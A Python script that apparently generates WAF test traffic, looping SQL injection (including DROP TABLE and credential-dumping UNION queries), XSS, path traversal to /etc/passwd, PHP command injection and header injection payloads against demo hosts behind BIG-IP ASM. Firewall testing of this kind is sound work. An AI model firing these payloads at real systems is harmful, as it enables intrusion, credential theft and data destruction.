import requests
import urllib3
import time
import random
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========= CONFIGURE THESE =========
TARGET_BASE_URLS = [
    "https://sslo.demo.f5",
    "https://ast.demo.f5",
    "https://ast42.demo.f5",
]  # all behind BIG-IP ASM
VERIFY_TLS = False          # set True if using valid certs
MAX_WORKERS = 10
TOTAL_REQUESTS = 200
LOG_EVERY = 10
# ===================================

session = requests.Session()

SQLI_PAYLOADS = [
    "' OR '1'='1' --",
    "' UNION SELECT username, password FROM users --",
    "admin' OR 1=1#",
    "'; DROP TABLE users; --",
]

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "\"><script>confirm(1)</script>",
    "<img src=x onerror=alert(1)>",
]

GENERIC_ATTACK_PAYLOADS = [
    "../../etc/passwd",
    "../../../../windows/win.ini",
    "<?php system('id'); ?>",
]

HEADERS_ATTACKS = [
    {"User-Agent": "<script>alert('ua')</script>"},
    {"X-Forwarded-For": "1.2.3.4' OR '1'='1"},
]

def pick_target(i: int) -> str:
    # round-robin across configured hosts
    return TARGET_BASE_URLS[i % len(TARGET_BASE_URLS)]

def attack_sql_in_param(i):
    base = pick_target(i)
    payload = SQLI_PAYLOADS[i % len(SQLI_PAYLOADS)]
    params = {"search": payload}
    r = session.get(f"{base}/search", params=params, verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} SQLi param -> {r.status_code} {r.url}")

def attack_sql_in_body(i):
    base = pick_target(i)
    payload = SQLI_PAYLOADS[i % len(SQLI_PAYLOADS)]
    data = {"username": "test", "password": payload}
    r = session.post(f"{base}/login", data=data, verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} SQLi body -> {r.status_code} {r.url}")

def attack_xss_in_param(i):
    base = pick_target(i)
    payload = XSS_PAYLOADS[i % len(XSS_PAYLOADS)]
    params = {"q": payload}
    r = session.get(f"{base}/search", params=params, verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} XSS param -> {r.status_code} {r.url}")

def attack_xss_in_body(i):
    base = pick_target(i)
    payload = XSS_PAYLOADS[i % len(XSS_PAYLOADS)]
    data = {"comment": payload}
    r = session.post(f"{base}/comment", data=data, verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} XSS body -> {r.status_code} {r.url}")

def attack_traversal_in_param(i):
    base = pick_target(i)
    payload = GENERIC_ATTACK_PAYLOADS[i % len(GENERIC_ATTACK_PAYLOADS)]
    params = {"file": payload}
    r = session.get(f"{base}/download", params=params, verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} Traversal param -> {r.status_code} {r.url}")

def attack_headers(i):
    base = pick_target(i)
    hdr = HEADERS_ATTACKS[i % len(HEADERS_ATTACKS)]
    r = session.get(f"{base}/", headers=hdr, verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} Header attack -> {r.status_code} {r.url}")

ATTACK_FUNCS = [
    attack_sql_in_param,
    attack_sql_in_body,
    attack_xss_in_param,
    attack_xss_in_body,
    attack_traversal_in_param,
    attack_headers,
]

def send_attack(i):
    func = ATTACK_FUNCS[i % len(ATTACK_FUNCS)]
    try:
        func(i)
    except Exception as e:
        if i % LOG_EVERY == 0:
            print(f"[{i}] Error: {e}")

def main():
    while True:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            executor.map(send_attack, range(TOTAL_REQUESTS))
        print("Batch complete, sleeping 3s...")
        time.sleep(3)

if __name__ == "__main__":
    main()
